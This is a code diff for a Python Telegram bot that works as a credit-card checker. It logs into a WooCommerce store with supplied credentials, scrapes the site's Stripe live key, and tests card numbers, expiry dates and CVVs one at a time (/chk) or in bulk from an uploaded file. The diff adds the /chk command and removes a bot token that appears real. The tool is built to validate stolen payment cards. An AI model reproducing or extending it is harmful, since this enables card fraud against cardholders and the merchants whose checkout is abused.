@@ -1,32 +1,24 @@
 import logging
 import requests
 import re
+import threading
 from bs4 import BeautifulSoup
 from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder,
-    CommandHandler,
-    MessageHandler,
-    ContextTypes,
-    filters
-)
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from io import BytesIO
 
-BOT_TOKEN = "8153748905:AAGp03pGvNcuL7CAhcOV92jGv2c9opX-BVU"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 
 logging.basicConfig(level=logging.INFO)
 user_data = {}
+lock = threading.Lock()
 
 def get_headers():
     return {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-        "Accept": "text/html,application/xhtml+xml",
-        "Accept-Language": "en-US,en;q=0.9"
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "accept": "text/html,application/xhtml+xml",
+        "accept-language": "en-US,en;q=0.9",
     }
-
-def extract_pk(html):
-    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
-    return match.group(0) if match else None
 
 def detect_stripe_type(html):
     if "setup_intent" in html:
@@ -39,22 +31,19 @@ def detect_stripe_type(html):
         return "token"
     return "unknown"
 
-def try_login(site, email, password):
-    session = requests.Session()
+def extract_pk(html):
+    match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
+    return match.group(0) if match else None
+
+def try_login(site, email, password, session):
     login_url = f"https://{site}/my-account/"
-    logging.info(f"Attempting to login to {site} with email: {email}")
     r = session.get(login_url, headers=get_headers())
-    
-    if r.status_code != 200:
-        logging.error(f"Failed to load login page, status code: {r.status_code}")
-        return None, "Login page error"
-    
     soup = BeautifulSoup(r.text, 'html.parser')
     nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
     referer = soup.find("input", {"name": "_wp_http_referer"})
 
     if not nonce:
-        return None, "Nonce not found in the login page"
+        return False, "Login page error."
 
     payload = {
         'username': email,
@@ -64,14 +53,8 @@ def try_login(site, email, password):
         'login': 'Log in'
     }
 
-    logging.info(f"Posting login data to {login_url}")
     r = session.post(login_url, data=payload, headers=get_headers())
-    if "customer-logout" in r.text:
-        logging.info("Login successful!")
-        return session, r.text
-    else:
-        logging.error(f"Login failed: {r.text}")
-        return None, "Login failed"
+    return ("customer-logout" in r.text), r.text
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -81,21 +64,21 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     site, email, password = args[0].split("|")
-    logging.info(f"Received /addsitelogin command from user {user_id} for site {site}")
-    
-    session, resp_html = try_login(site, email, password)
-    if not session:
-        await update.message.reply_text(f"Login failed: {resp_html}")
+    session = requests.Session()
+
+    success, resp_html = try_login(site, email, password, session)
+    if not success:
+        await update.message.reply_text("Login failed.")
         return
 
-    user_data[user_id] = {
-        "site": site,
-        "email": email,
-        "password": password,
-        "session": session,
-    }
+    with lock:
+        user_data[user_id] = {
+            "site": site,
+            "email": email,
+            "password": password,
+            "session": session,
+        }
 
-    logging.info(f"User {user_id} logged in successfully to {site}. Asking for the payment URL.")
     await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
 
 async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -119,7 +102,6 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data[user_id]["pk"] = pk_live
     user_data[user_id]["stripe_type"] = stripe_type
 
-    logging.info(f"Stripe key detected: {pk_live}, Type: {stripe_type}")
     await update.message.reply_text(f"Stripe key: `{pk_live}`\nType: `{stripe_type}`", parse_mode="Markdown")
 
 def parse_card(card):
@@ -180,6 +162,21 @@ def check_card(card, data):
     except Exception as e:
         return f"{card} -> Error: {e}"
 
+async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_data:
+        await update.message.reply_text("Please use /addsitelogin first.")
+        return
+
+    # Ensure input is in the format card|exp_month|exp_year|cvv
+    if len(context.args) < 1 or '|' not in context.args[0]:
+        await update.message.reply_text("Usage: /chk card|exp_month|exp_year|cvv")
+        return
+
+    card = context.args[0]
+    result = check_card(card, user_data[user_id])
+    await update.message.reply_text(result)
+
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in user_data:
@@ -215,6 +212,7 @@ def main():
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
     app.add_handler(MessageHandler(filters.Document.TEXT, mchk))
+    app.add_handler(CommandHandler("chk", chk))  # Added /chk handler
     app.run_polling()
 
 if __name__ == "__main__":
